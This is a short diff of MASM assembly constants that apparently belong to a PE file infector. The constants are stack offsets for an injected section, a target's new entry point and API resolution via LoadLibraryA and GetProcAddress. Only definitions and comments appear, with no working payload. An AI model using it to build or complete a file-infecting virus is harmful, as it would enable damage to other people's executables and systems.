@@ -7,21 +7,21 @@ option casemap: none
 ; .const
 	; Order of each variable IN THE STACK
 	; Position relative to r|ebp calculated by -(Order * regSz)
-    selfName EQU 1
-	selfImageBaseAddress EQU 2
-	selfSection EQU 3
-	selfEntry EQU 4
-	selfHand EQU 5
+    deltaAddr EQU 1
+    old_ebp EQU 2
+	selfImageBaseAddress EQU 3
+	selfSection EQU 4			; VA of injected section
+	selfEntry EQU 5				; VA of EntryPoint
 	selfVirtualSize EQU 6
 	selfPointerToRawData EQU 7
 	
 	tgHand EQU 8
 	tgNewEntry EQU 9
 	lfanew EQU 10
-	NumberOfSections EQU 11 ; Before injection
-	SizeOfOptionalHeader EQU 12
+	NumberOfSections EQU 11 ; WORD; Before injection
+	SizeOfOptionalHeader EQU 12 ; WORD
 	ioh_offset EQU 13
-	Magic EQU 14 ; 10Bh => 32=bit; 20Bh => 64-bit
+	Magic EQU 14 ; WORD; 10Bh => 32=bit; 20Bh => 64-bit
 	AddressOfEntryPoint EQU 15
 	SectionAlignment EQU 16
 	FileAlignment EQU 17
@@ -44,7 +44,6 @@ option casemap: none
     fclose EQU 32 		; CloseHandle
     fread EQU 33 		; ReadFile
     fwrite EQU 34 		; WriteFile
-    argv0 EQU 35
     ferror EQU 36		; GetLastError
     loadlib EQU 37 		; LoadLibraryA
     getaddr EQU 38 		; GetProcAddress
